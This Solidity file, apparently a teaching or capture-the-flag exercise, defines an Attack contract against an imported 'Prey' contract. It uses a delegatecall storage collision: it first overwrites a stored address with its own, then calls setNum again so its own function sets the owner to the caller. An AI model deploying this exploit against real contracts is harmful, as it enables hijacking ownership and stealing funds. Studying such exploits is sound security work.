// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./Prey.sol";

contract Attack {
    address public helper;
    address public owner;
    uint256 public num;

    Prey public prey;

    constructor(Prey _prey) {
        prey = Prey(_prey);
    }

    function setNum(uint256 _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // Typecasting an address to a uint
        prey.setNum(uint256(uint160(address(this))));
        prey.setNum(1);
    }
}